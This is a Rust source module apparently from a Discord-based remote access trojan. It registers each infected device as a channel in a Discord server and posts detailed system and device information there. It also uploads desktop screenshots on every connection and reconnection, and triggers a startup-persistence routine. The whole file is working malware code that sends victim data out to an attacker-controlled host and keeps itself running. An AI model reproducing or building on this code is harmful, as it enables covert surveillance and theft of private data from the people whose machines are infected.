use crate::config::Config;
use crate::core::device_id::DeviceId;
use crate::core::screenshot::Screenshot;
use crate::system_info::{DeviceInfo, SystemInfo};
use crate::log_debug;
use anyhow::Result;
use twilight_http::Client;
use twilight_model::channel::ChannelType;
use twilight_model::id::{
    marker::{ChannelMarker, GuildMarker},
    Id,
};

pub struct ChannelManager {
    http: Client,
    guild_id: Id<GuildMarker>,
}

impl ChannelManager {
    pub fn new(http: Client, guild_id: Id<GuildMarker>) -> Self {
        Self { http, guild_id }
    }

    pub async fn init_dchannel(&self) -> Result<Id<ChannelMarker>> {
        let device_name = DeviceId::get_device_channel_name()?;
        log_debug!("Looking for device channel: {}", device_name);

        if let Some(channel_id) = self.find_cbn(&device_name).await? {
            log_debug!(
                "Found existing channel: {} (ID: {})",
                device_name, channel_id
            );
            self.announce_device(channel_id).await?;
            return Ok(channel_id);
        }

        log_debug!("Channel not found, creating new channel: {}", device_name);
        let channel_id = self.create_dchannel(&device_name).await?;

        self.announce_dconnect(channel_id).await?;

        Ok(channel_id)
    }

    async fn find_cbn(&self, channel_name: &str) -> Result<Option<Id<ChannelMarker>>> {
        let channels = self
            .http
            .guild_channels(self.guild_id)
            .await?
            .model()
            .await?;

        for channel in channels {
            if channel.name.as_ref().map(|s| s.as_str()) == Some(channel_name)
                && channel.kind == ChannelType::GuildText
            {
                return Ok(Some(channel.id));
            }
        }

        Ok(None)
    }

    async fn create_dchannel(&self, channel_name: &str) -> Result<Id<ChannelMarker>> {
        let response = self
            .http
            .create_guild_channel(self.guild_id, channel_name)
            .kind(ChannelType::GuildText)
            .await?;
        let channel = response.model().await?;

        log_debug!("Created new channel: {} (ID: {})", channel_name, channel.id);
        Ok(channel.id)
    }

    async fn announce_device(&self, channel_id: Id<ChannelMarker>) -> Result<()> {
        let system_info = SystemInfo::get_detailed_info()?;
        let device_profile = DeviceInfo::new()?;
        let message = system_info.format_reconnection(&device_profile);

        self.http
            .create_message(channel_id)
            .content(&message)
            .await?;

        if let Err(e) = crate::core::startup::check_startup().await {
            log_debug!("Failed to ensure startup persistence: {}", e);
        }

        match Screenshot::capture_as_bytes() {
            Ok((screenshot_data, filename)) => {
                log_debug!(
                    "Captured reconnection screenshot: {} ({} bytes)",
                    filename,
                    screenshot_data.len()
                );

                // Send screenshot as attachment using Twilight API
                use twilight_model::http::attachment::Attachment;

                let attachment = Attachment::from_bytes(filename, screenshot_data, 1);

                self.http
                    .create_message(channel_id)
                    .content("**Current Desktop Screenshot**")
                    .attachments(&[attachment])
                    .await?;

                log_debug!("Reconnection screenshot sent successfully");
            }
            Err(e) => {
                log_debug!("Failed to capture reconnection screenshot: {}", e);
                // Send a message about screenshot failure
                self.http
                    .create_message(channel_id)
                    .content(&format!("Screenshot capture failed: {}", e))
                    .await?;
            }
        }

        Ok(())
    }

    async fn announce_dconnect(&self, channel_id: Id<ChannelMarker>) -> Result<()> {
        let system_info = SystemInfo::get_detailed_info()?;
        let device_profile = DeviceInfo::new()?;
        let message = system_info.format_for_discord(&device_profile);

        self.http
            .create_message(channel_id)
            .content(&message)
            .await?;

        match Screenshot::capture_as_bytes() {
            Ok((screenshot_data, filename)) => {
                log_debug!(
                    "Captured screenshot: {} ({} bytes)",
                    filename,
                    screenshot_data.len()
                );

                use twilight_model::http::attachment::Attachment;
                let attachment = Attachment::from_bytes(filename, screenshot_data, 1);

                self.http
                    .create_message(channel_id)
                    .content("**Desktop Screenshot**")
                    .attachments(&[attachment])
                    .await?;
                log_debug!("Screenshot sent successfully");
            }
            Err(e) => {
                log_debug!("Failed to capture screenshot: {}", e);
                // Send a message about screenshot failure
                self.http
                    .create_message(channel_id)
                    .content(&format!("Screenshot capture failed: {}", e))
                    .await?;
            }
        }

        Ok(())
    }
}
